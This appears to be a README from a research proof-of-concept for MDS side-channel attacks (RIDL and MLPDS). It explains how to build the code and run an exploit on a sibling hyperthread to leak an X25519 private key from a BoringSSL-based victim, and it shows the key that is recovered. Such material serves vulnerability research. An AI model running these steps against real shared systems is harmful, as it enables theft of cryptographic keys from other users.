

# MDS exploits

## How to run

The RIDL exploit, `leak_evict_x25519.c` unfortunately targets an internal
server, so you won't be able to reproduce our results.

MLPDS exploit, although it targets the same server, does not depend on its
memory layout etc. - so we prepared a custom victim that just calls `X25519`
function in an infinite loop. To run, first compile the code:

```
make
```

This will also clone the boringssl repository (it's a dependency).
Check how many cores your CPU has:

```
nproc --all
```

For my workstation, it prints `12`, which means I have 6 cores (with
hyperthreading doubling the number). Run the victim:

```
taskset -a -c 2 ./x25519_victim
```

In another terminal, run the exploit:

```
taskset -a -c 8 ./leak_intermediate_x25519 <<< "1 2 3 4 5 6 7 8 9 a b c d e f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20"
```

The `1 2 3...` string is the client private key used in X25519.
Note that I pin the two processes to cores 2 and 8, which are 6 apart - meaning
they occupy sibling threads. You should see some intermediate output pretty quickly, and
after 255 iterations (say 10 minutes, depending on CPU), the process will finish.
The last line will show the leaked secret:

```
Secret: 70 72 69 76 74 65 73 74 31 32 33 34 35 36 37 38 73 6f 6d 65 6d 6f 72 65 62 69 74 73 41 42 43 44
```

If you decode the hexadecimal, it says `privtest12345678somemorebitsABCD`, which
was the private key hardcoded in `x25519_victim.c`.

If you wait several minutes and always get only `--- diff_abs 0 (0 vs. 0, total 0)`
result, something's wrong. You should check if hyperthreading is enabled, and
that your CPU supports TSX and it's not disabled.

If you want to try the multithreaded exploit, `leak_multiprocess.c`, before
compiling change the `#define CPU_NUM 6` to the actual number of cores in your
CPU. Other than that, the usage is the same.
